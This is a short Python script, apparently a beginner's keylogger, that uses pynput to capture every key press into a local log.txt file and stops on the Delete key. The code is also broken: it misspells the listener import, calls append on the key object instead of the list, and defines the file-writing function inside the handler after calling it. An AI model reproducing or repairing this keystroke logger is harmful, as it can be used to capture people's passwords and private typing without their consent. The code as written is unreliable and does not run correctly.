import pynput
from pynput.keyboard import Key,listerner
Keys=[]
def on_press(Key):
    Key.append(Key)
    write_file(Keys)
    def write_file(Keys):
        with open('log.txt','w') as f:
            for key in Keys:
                k=str(key).replace("'","")
                f.write(k)
                f.write('  ')
def on_release(key):
    if key == Key.delete:
        return False
with Listener(on_press = on_press,on_release= on_release) as listener:
    listerner.join()